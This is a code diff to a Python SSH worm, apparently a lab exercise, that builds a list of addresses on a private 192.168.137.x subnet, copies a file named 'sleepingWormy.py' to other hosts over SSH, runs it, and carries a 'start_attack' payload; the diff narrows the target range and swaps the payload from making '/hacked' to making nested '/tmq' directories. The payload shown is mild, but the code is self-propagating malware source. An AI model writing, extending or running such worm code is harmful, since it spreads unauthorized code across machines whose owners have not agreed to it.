@@ -11,6 +11,7 @@ import paramiko
 import sys
 import os
 import socket
+import random
 
 ip_range = []
 
@@ -29,7 +30,7 @@ A function that creates IP addresses and adds them to the ip_range list in the r
 from 192.168.137.2 - 192.168.137.254
 """
 def generate_IP_list():
-    for i in range(143, 145): 
+    for i in range(143, 144): 
         ip = "192.168.137." + str(i)
         ip_range.append(ip)
 
@@ -93,6 +94,7 @@ A function that copies the worm file to the other device via ssh connection and 
 def copy_worm_excute(ssh_connx):
 
     worm_file = "sleepingWormy.py"
+    #worm_file = "HelloHacker.py"
 
     print("Copying worm and excuting it now")
 
@@ -111,7 +113,16 @@ def copy_worm_excute(ssh_connx):
 A function that starts doing harmful attack to the device it is running on
 """
 def start_attack():
-    os.mkdir("/hacked")
+    directory = "/tmq"
+    count = 0
+    while count < 2:
+        try:
+            os.mkdir(directory)
+            print(directory)
+            directory += "/tmq"
+            count += 1
+        except FileExistsError:
+            directory += str(random.randint(1,100))
 
 
 if __name__ == "__main__":
@@ -123,4 +134,4 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         if sys.argv[1] == "1":
             start_attack()
-            #print("inside if statement")
+            print("inside if statement")
